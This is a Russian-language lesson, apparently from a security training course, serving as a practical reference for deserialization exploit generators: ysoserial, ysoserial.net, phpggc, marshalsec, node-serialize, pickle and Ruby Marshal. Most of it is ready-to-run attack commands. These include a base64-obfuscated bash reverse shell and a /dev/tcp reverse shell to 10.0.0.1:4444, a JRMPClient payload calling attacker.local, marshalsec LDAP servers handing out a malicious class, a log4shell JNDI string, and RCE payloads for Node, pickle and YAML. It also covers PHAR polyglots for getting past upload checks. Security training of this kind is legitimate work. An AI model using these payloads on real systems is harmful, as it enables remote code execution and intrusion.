---
id: web-tool-deser
title: "Инструменты десериализации: ysoserial, phpggc, marshalsec"
category: web
parent: web-tools-exploit
difficulty: medium
order: 3
tags: [deserialization, ysoserial, phpggc, marshalsec, gadget, java, php, pickle]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Полный справочник генераторов gadget-цепочек: ysoserial (Java), ysoserial.net, phpggc, marshalsec (JNDI), node-serialize и pickle — с кодированием и встраиванием."
---

Уязвимость десериализации опасна тем, что уязвимый `unserialize`/`readObject` запускает цепочку классов (gadget chain), приводящую к RCE. Писать такую цепочку руками — дни работы; поэтому используют готовые генераторы. В этом уроке — практический справочник: какой инструмент под какой язык, точные команды, кодирование payload и встраивание его в запрос. Минимум теории — максимум генерации и отправки.

## Шпаргалка: генератор под язык

| Язык / протокол | Инструмент | Быстрая генерация |
|-----------------|-----------|-------------------|
| Java (RCE) | ysoserial | `java -jar ysoserial.jar CommonsCollections1 'id'` |
| Java (JNDI) | marshalsec | `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://IP:8000/#Exploit"` |
| .NET | ysoserial.net | `ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64` |
| PHP | phpggc | `phpggc -b Monolog/RCE1 system id` |
| PHP (PHAR) | phpggc | `phpggc -p phar -o z.phar Monolog/RCE1 system id` |
| Node.js | node-serialize | `{"rce":"_$$ND_FUNC$$_function(){...}()"}` |
| Python | pickle | `pickle.dumps(RCE())` (класс с `__reduce__`) |
| Ruby | universal_gadget_chain | `ruby universal_gadget_chain.rb 'id'` |
| Java (проверка) | ysoserial `URLDNS` | `java -jar ysoserial.jar URLDNS http://COLLAB` |

## Карта инструментов по языкам

| Язык | Инструмент | Формат payload |
|------|-----------|----------------|
| Java | **ysoserial** | сериализованный Java-объект (base64/raw) |
| Java (JNDI) | **marshalsec** | LDAP/RMI-сервер для JNDI-инъекции |
| .NET | **ysoserial.net** | BinaryFormatter/Json.NET/XAML и др. |
| PHP | **phpggc** | PHP `serialize` / Phar |
| Node.js | **node-serialize** | JS-объект с `_$$ND_FUNC$$_` |
| Python | **pickle** (`pickletools`, `python2`) | pickle-поток |
| Ruby | **Marshal** (`universal_gadget_chain`) | Marshal-поток |

## ysoserial (Java): цепочки и использование

Скачивание и запуск:

```bash
java -jar ysoserial.jar 2>&1 | head -50    # список цепочек (gadgets)
```

Список цепочек (полный, ysoserial master):

| Цепочка | Требуемые библиотеки / примечание |
|---------|-----------------------------------|
| `CommonsCollections1` | commons-collections 3.1 |
| `CommonsCollections2` | commons-collections4 4.0 |
| `CommonsCollections3` | commons-collections 3.1 |
| `CommonsCollections4` | commons-collections4 4.0 |
| `CommonsCollections5` | commons-collections 3.1 |
| `CommonsCollections6` | commons-collections 3.1 |
| `CommonsCollections7` | commons-collections 3.1 |
| `CommonsBeanutils1` | commons-beanutils |
| `Spring1` | spring-core, spring-beans |
| `Spring2` | spring-core, spring-beans (JDK ≤ 8u?) |
| `Groovy1` | groovy |
| `Hibernate1` | hibernate-core |
| `Hibernate2` | hibernate-core |
| `BeanShell1` | bsh |
| `C3P0` | c3p0 |
| `Click1` | click-nodeps |
| `Clojure` | clojure |
| `FileUpload1` | commons-fileupload |
| `JBossInterceptors1` | jboss-interceptors, javassist |
| `JavassistWeld1` | javassist, weld |
| `Jdk7u21` | только JDK 7u21 (без внешних библиотек) |
| `Jython1` | jython |
| `JSON1` | json-lib |
| `MozillaRhino1` | rhino |
| `MozillaRhino2` | rhino |
| `Myfaces1` | myfaces |
| `Myfaces2` | myfaces |
| `ROME` | rome |
| `Vaadin1` | vaadin |
| `Wicket1` | wicket |
| `AspectJWeaver` | aspectjweaver (запись файла, не RCE) |
| `DynamicDependencies` | только JDK (загрузка удалённых классов) |
| `JRMPClient` | только JDK (обращение к вашему JRMPListener) |
| `JRMPListener` | только JDK (серверная сторона, `ysoserial.exploit.JRMPListener`) |
| `URLDNS` | только JDK (только DNS-проверка, не RCE) |

Базовый вызов:

```bash
# выполнить команду, получить base64
java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' | base64 -w0

# сохранить raw-байты для прямой отправки
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' > payload.bin
```

Важные детали:

- **`-cp`/`--classpath`:** если у вас свои версии библиотек, укажите их: `java -cp ysoserial.jar:libs/commons-collections-3.1.jar ysoserial.payloads.CommonsCollections1 'id'`.
- **Выбор цепочки:** не существует «универсальной». Подбирается по **версии и составу библиотек на цели**. CommonsCollections 3.1 ≠ 4.0 (разные цепочки), Spring1 требует spring-core.
- **URLDNS** — безопасная проверка: только DNS-запрос на ваш Collaborator; подтверждает сам факт десериализации, не выполняя код.
- **JRMPClient + JRMPListener** — когда нет подходящей библиотеки, но есть egress:

```bash
# на атакующем: поднять слушателя
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'id'
# payload, указывающий на слушателя
java -jar ysoserial.jar JRMPClient 'attacker.local:1099' | base64 -w0
```

## ysoserial.net (.NET)

```powershell
ysoserial.exe -l                                  # список gadgets
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g ObjectDataProvider -f Xaml -c "calc.exe"
```

| Параметр | Значение |
|----------|----------|
| `-g` | gadget (см. таблицу gadgets) |
| `-f` | formatter (см. таблицу formatters) |
| `-c` | команда (для некоторых gadget — путь к .cs файлу) |
| `-o` | output: `base64`, `raw`, `json`, `url` |
| `--minify` | минимизировать payload |
| `-l` | список gadgets |
| `--fullhelp` | подробная справка по всем опциям |
| `-p` | plugin (ViewState, DotNetNuke, SharePoint, Resx, ...) |
| `--var`, `--variant` | вариант payload для gadget |
| `--generator` | генератор для plugin (например ViewState) |
| `--validationkey` | validation key для ViewState |
| `--validationalg` | алгоритм валидации (SHA1, HMACSHA256, ...) |
| `--decryptionkey` / `--decryptionalg` | ключ/алгоритм шифрования ViewState |
| `--islegacy` | legacy-режим для ViewState |
| `--minify` | убрать лишние байты |
| `--rawcmd` | не экранировать команду |
| `--outputfile` / `--of` | записать payload в файл |
| `--test` | сгенерировать и проверить (не выполнять) |
| `--searchformatter` | найти formatter, поддерживающий gadget |

**Gadgets (полный список ysoserial.net):**

| Gadget | Примечание |
|--------|-----------|
| `TypeConfuseDelegate` | классика .NET (BinaryFormatter/LosFormatter) |
| `TypeConfuseDelegateMono` | вариант для Mono |
| `ObjectDataProvider` | XAML/BinaryFormatter, запуск процесса |
| `TextFormattingRunProperties` | XAML, популярен для ViewState |
| `ActivitySurrogateSelector` | .NET, обход type-check |
| `ActivitySurrogateSelectorFromFile` | + компиляция .cs |
| `ActivitySurrogateDisableTypeCheck` | отключает проверку типов |
| `AxHostState` | WinForms |
| `BaseActivationFactory` | .NET 5/6/7 + WPF, загрузка DLL |
| `ClaimsIdentity` / `ClaimsPrincipal` | Windows Identity |
| `WindowsIdentity` / `WindowsPrincipal` | импersonation |
| `WindowsClaimsIdentity` | |
| `DataSet` / `DataSetOldBehaviour` / `DataSetTypeSpoof` | DataSet |
| `GenericPrincipal` / `RolePrincipal` | |
| `GetterCompilerResults` | .NET 5/6/7, загрузка DLL |
| `GetterSecurityException` | |
| `GetterSettingsPropertyValue` | |
| `ObjRef` | |
| `PSObject` | PowerShell |
| `ResourceSet` | |
| `SessionSecurityToken` | |
| `SessionViewStateHistoryItem` | |
| `ToolboxItemContainer` | |
| `XamlAssemblyLoadFromFile` | загрузка сборки из файла |
| `XmlSerializer` (через плагины) | |

**Formatters (полный список):**

| Formatter | Где встречается |
|-----------|-----------------|
| `BinaryFormatter` | .NET remoting, многие десериализаторы |
| `LosFormatter` | ASP.NET ViewState |
| `ObjectStateFormatter` | ASP.NET ViewState (новый) |
| `NetDataContractSerializer` | WCF |
| `DataContractSerializer` | WCF |
| `DataContractJsonSerializer` | WCF/JSON |
| `SoapFormatter` | .NET remoting (Soap) |
| `Xaml` | XAML-парсер |
| `Json.NET` | Newtonsoft.Json |
| `FastJson` | fastJSON |
| `JavaScriptSerializer` | ASP.NET AJAX |
| `XmlSerializer` | XML |
| `MessagePackTypeless` / `MessagePackTypelessLz4` | MessagePack |
| `SharpSerializerBinary` / `SharpSerializerXml` | SharpSerializer |
| `YamlDotNet < 5.0.0` | YAML |
| `FsPickler` | FsPickler |

Пример для ViewState без MAC (или с известным ключом):

```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=... --validationkey=... --validationalg=SHA1 --islegacy
```

## phpggc (PHP): цепочки и кодирование

```bash
phpggc -l                          # список цепочек
phpggc -l Laravel                  # фильтр по фреймворку
phpggc Monolog/RCE1 system 'id'    # цепочка + функция + команда
```

| Флаг | Значение | Пример |
|------|----------|--------|
| `-l`, `--list` | список всех цепочек (можно фильтровать) | `phpggc -l Laravel` |
| `-i`, `--informations` | подробная инфо о цепочке | `phpggc -i symfony/rce1` |
| `-b`, `--base64` | base64 (без переносов) | `phpggc -b Monolog/RCE1 system id` |
| `-u`, `--url` | urlencode | `phpggc -u Monolog/RCE1 system id` |
| `-s`, `--soft` | soft urlencode (читаемо, кодирует только спецсимволы) | `phpggc -s Monolog/RCE1 system id` |
| `-j`, `--json` | JSON-кодирование | `phpggc -j Monolog/RCE1 system id` |
| `-f`, `--fast-destruct` | fast-destruct (уничтожение объекта сразу после unserialize) | `phpggc -f Monolog/RCE1 system id` |
| `-p`, `--phar FORMAT` | упаковать в PHAR/TAR/ZIP | `phpggc -p phar -o z.phar Monolog/RCE1 system id` |
| `-pj`, `--phar-jpeg FILE` | PHAR-полиглот JPEG из картинки | `phpggc -pj dummy.jpg -o z.zip.phar Monolog/RCE1 system id` |
| `-pp`, `--phar-prefix STR` | префикс для полиглота (напр. `GIF89a`) | `phpggc -p phar -pp 'GIF89a' -o z.gif.phar Monolog/RCE1 system id` |
| `-pf`, `--phar-filename NAME` | имя файла внутри PHAR | `phpggc -p phar -pf shell.php -o z.phar Monolog/RCE1 system id` |
| `-o FILE`, `--output FILE` | сохранить в файл | `phpggc -o payload.bin Monolog/RCE1 system id` |
| `-w FILE`, `--wrapper FILE` | обёртка (process_object/process_serialized) | `phpggc -w my_wrapper.php slim/rce1 system id` |
| `-se`, `--session-encode` | PHP session-кодирование | `phpggc -se Monolog/RCE1 system id` |
| `-pub`, `--public-properties` | публичные свойства вместо защищённых | |
| `-a`, `--ascii-strings` | только ASCII (без NULL-байтов) | |
| `-A`, `--armor-strings` | все символы в hex-формате `S:` | |
| `-n`, `--plus-numbers` | `+`-числа вместо обычных | |
| `-N`, `--new` | создать шаблон новой цепочки | |
| `-h`, `--help` | справка | |

**Фреймворки и типы цепочек (полный список `phpggc -l`):**

| Фреймворк/CMF | Доступные типы цепочек |
|---------------|------------------------|
| Bitrix | RCE1 |
| CakePHP | RCE1, RCE2 |
| CodeIgniter4 | FR1, RCE1–RCE6 |
| Doctrine | FW1, FW2, RCE1, RCE2 |
| Dompdf | FD1 |
| Drupal | AT, FD, PsySH, RCE, SQLI, SSRF, XXE |
| Drupal7 | FD, RCE, SQLI, SSRF |
| Grav | FD1 |
| Guzzle | FW1, INFO1, RCE1 |
| Horde | RCE1 |
| Joomla | FW1 |
| Kohana | FR1 |
| Laminas | FD1, FW1 |
| Laravel | FD1, RCE1–RCE10 |
| Magento | FW1, SQLI1 |
| Magento2 | FD1 |
| MediaWiki | FD1, FW1, RCE1 |
| Monolog | FW1, RCE1 |
| OpenCart | FW1, RCE1 |
| PHPCSFixer | FD1 |
| PHPExcel | FD1 |
| PHPSecLib | RCE1 |
| PHPWord | FD1 |
| Phalcon | RCE1 |
| Phing | FD1 |
| Plates | RCE1 |
| Pydio | (Guzzle) |
| Silverstripe | FD1 |
| Slim | RCE1 |
| Smarty | FD1, SSRF1 |
| Snappy | FD1 |
| Spiral | RCE1 |
| Sulu | RCE1 |
| SwiftMailer | FD1, FR1, FW1 |
| Symfony | FD1, FW1, RCE1–RCE… |
| TCPDF | FD1 |
| ThinkPHP | FW1, RCE1 |
| Typo3 | FD1 |
| WordPress | Dompdf, Guzzle, P1, PHPExcel, RCE, generic |
| Yii | RCE1 |
| Yii2 | RCE1 |
| ZendFramework | FD1, RCE1 |
| phpThumb | FD1 |
| vBulletin | RCE1 |

Типы: **RCE** — выполнение кода, **FD** — file delete, **FR** — file read, **FW** — file write, **SQLI/SSRF/XXE/INFO/AT/PsySH** — соответствующая примитива.

Примеры:

```bash
# RCE через Monolog
phpggc -b Monolog/RCE1 system 'id'
# Laravel (популярно на реальных таргетах)
phpggc -b Laravel/RCE5 system 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
# PHAR-десериализация (загрузка файла → срабатывает на file_ops)
phpggc -p phar -o evil.phar Monolog/RCE1 system id
# Готовый phar с полиглотом (GIF + phar)
phpggc -p phar -pp 'GIF89a' -o evil.gif.phar Monolog/RCE1 system id
```

Ключевой нюанс: PHAR-цепочки срабатывают **при файловых операциях** над phar-файлом (`file_exists`, `getimagesize`, `md5_file`), даже без явного `unserialize`. Имя файла-полиглота можно переименовать в `.jpg`/`.gif` для обхода загрузчиков.

## marshalsec (JNDI/LDAP/RMI)

`marshalsec` поднимает LDAP/RMI-сервер, отдающий ссылку на вредоносный класс. Классика log4shell и JNDI-инъекций.

```bash
# 1. Скомпилировать вредоносный класс (Exploit.java → Exploit.class)
# 2. Поднять HTTP-сервер с классом
python3 -m http.server 8000
# 3. Поднять LDAP-сервер, отдающий ссылку на класс
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://10.0.0.1:8000/#Exploit"
```

**JNDI-серверы marshalsec:**

| Класс | Что отдаёт | Пример |
|-------|-----------|--------|
| `marshalsec.jndi.LDAPRefServer` | LDAP-ссылка на удалённый класс | `...LDAPRefServer "http://IP:8000/#Exploit"` |
| `marshalsec.jndi.RMIRefServer` | RMI-ссылка на удалённый класс | `...RMIRefServer "http://IP:8000/#Exploit"` |

Синтаксис URL: `http://<host>:<port>/#<ClassName>` — `#` отделяет имя класса; слушатель по умолчанию на порту `1389` (LDAP) / `1099` (RMI), можно указать второй аргумент-порт.

**Gadget-цепочки marshalsec (для других протоколов сериализации):**

| Класс | Формат |
|-------|--------|
| `marshalsec.Java` | Java-сериализация (свой аналог ysoserial) |
| `marshalsec.BlazeDSAMF0/AMF3/AMF3AM/AMFX` | BlazeDS AMF |
| `marshalsec.Red5AMF0/AMF3` | Red5 AMF |
| `marshalsec.Burlap` | Burlap |
| `marshalsec.Castor` | Castor XML |
| `marshalsec.Hessian` / `Hessian2` | Hessian |
| `marshalsec.Jackson` | Jackson (polymorphic) |
| `marshalsec.JYAML` | JYAML |
| `marshalsec.JsonIO` | JsonIO |
| `marshalsec.Kryo` | Kryo |
| `marshalsec.SnakeYAML` | SnakeYAML |
| `marshalsec.XStream` | XStream |
| `marshalsec.YAMLBeans` | YAMLBeans |

Payload для JNDI-инъекции (log4shell):

```
${jndi:ldap://10.0.0.1:1389/Exploit}
```

Ограничения: современные JDK (>= 8u191, 11.0.1, 17) блокируют загрузку удалённых классов по умолчанию (`com.sun.jndi.ldap.object.trustURLCodebase=false`). Тогда используют локальные фабрики/цепочки (Tomcat BeanFactory, `org.apache.naming.factory.BeanFactory` + EL) — но это уже требует своей gadget-библиотеки.

## node-serialize / JS

Для модуля `node-serialize` уязвим `unserialize` с функциями `_$$ND_FUNC$$_`:

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}
```

Обратите внимание на `()` в конце — немедленный вызов. Payload можно передать в cookie/base64-параметре, который приложение десериализует.

## Python pickle

```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

Проверка и разбор подозрительного потока:

```bash
pickletools dis payload.pkl     # дизассемблировать pickle
```

Уязвим также `yaml.load` (не `safe_load`) — payload: `!!python/object/apply:os.system ["id"]`.

## Ruby Marshal

Инструмент `universal_gadget_chain` (или `marshal` payloads из metasploit):

```bash
ruby universal_gadget_chain.rb 'id' | base64
```

## Кодирование и встраивание payload

Payload почти никогда не отправляют как есть — его нужно встроить в конкретный транспорт:

| Транспорт | Кодирование |
|-----------|-------------|
| Cookie (URL) | base64 → urlencode |
| JSON-поле | base64 (raw-байты в JSON недопустимы) |
| Заголовок | base64 (без `+`/`/` при возможности — используйте base64url) |
| POST form | urlencode сырых байтов |
| Java `ObjectInputStream` | raw-байты (не base64) |
| PHAR-загрузка | файл как есть, полиглот с префиксом |

Полезные команды:

```bash
base64 -w0 payload.bin
base64 -w0 payload.bin | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))"
# base64url
base64 -w0 payload.bin | tr '+/' '-_' | tr -d '='
```

## Практический workflow

1. **Определить язык и точку десериализации.** Java: `rO0AB`/`AC ED 00 05`; PHP: `O:`/`a:`; .NET: `AAEAAAD`/`/wEPDw`; Python: `gASV`/`\x80\x04`; Node: `_$$ND_FUNC$$_`.
2. **Проверить факт десериализации безопасно.** Java → `URLDNS` с Collaborator; PHP → простой `O:8:"stdClass":0:{}`.
3. **Определить состав библиотек** (по ошибкам, версиям фреймворка, `Server`-заголовкам, утечкам).
4. **Выбрать цепочку** под эти библиотеки: `ysoserial <chain>` / `phpggc <framework>/RCE<n>`.
5. **Сгенерировать и закодировать** под транспорт.
6. **Отправить и подтвердить** — reverse shell или запись маркера.
7. **Зафиксировать PoC** — точная команда генерации + запрос.

## Частые ошибки

- **Неподходящая цепочка.** `CommonsCollections1` не сработает, если на цели commons-collections 4.x — нужна другая цепочка.
- **Забыть про base64/urlencode.** Raw-байты в cookie/JSON не долетят.
- **Путать проверку с эксплуатацией.** `URLDNS` подтверждает десериализацию, но не даёт RCE.
- **Игнорировать версию JDK при JNDI.** На новых JDK удалённая загрузка классов запрещена.
- **Забыть про PHAR-триггер.** PHAR-цепочка срабатывает только при файловой операции над файлом.
- **Уронить сервис.** Некоторые цепочки/классы могут вызвать ошибку загрузки; тестируйте безопасным маркером.

## Квиз

```quiz
- question: "Какой инструмент генерирует gadget-цепочки для Java?"
  options:
    - "phpggc"
    - "ysoserial"
    - "pickletools"
    - "dalfox"
  answer: 1
  explanation: "ysoserial — генератор Java-цепочек (CommonsCollections и др.)."
- question: "Что делает цепочка URLDNS в ysoserial?"
  options:
    - "Выполняет команду на цели"
    - "Только инициирует DNS-запрос (безопасная проверка десериализации)"
    - "Пишет файл"
    - "Поднимает reverse shell"
  answer: 1
  explanation: "URLDNS не даёт RCE — только DNS-обращение на Collaborator."
- question: "Какой флаг phpggc кодирует payload в base64?"
  options:
    - "-u"
    - "-b"
    - "-p"
    - "-f"
  answer: 1
  explanation: "`-b` — base64, `-u` — urlencode, `-p` — phar, `-f` — fast-destruct."
- question: "Чем ограничена JNDI-эксплуатация через marshalsec на новых JDK?"
  options:
    - "Не поддерживается LDAP"
    - "Запрещена загрузка удалённых классов (trustURLCodebase=false)"
    - "Не работает base64"
    - "Нужен Windows"
  answer: 1
  explanation: "С JDK 8u191+/11.0.1+/17 удалённая кодовая база по умолчанию запрещена."
- question: "При каком условии срабатывает PHAR-цепочка?"
  options:
    - "При любом HTTP-запросе"
    - "При файловой операции над phar-файлом"
    - "Только при unserialize"
    - "Только при загрузке на сервер"
  answer: 1
  explanation: "PHAR-метаданные десериализуются при file_ops (file_exists, md5_file и т.п.)."
```

## Где пригодится

- **CTF (Web):** Java/PHP deserialization — частые задачи; готовые цепочки экономят часы.
- **Bug bounty:** десериализация в cookie/параметре — критичный баг с высоким payout.
- **Пентест:** цепочка JNDI/PHAR — стандартный путь к RCE в корпоративных Java/PHP-приложениях.
- **Работа (AppSec):** знание цепочек помогает находить небезопасные точки в коде и при ревью.
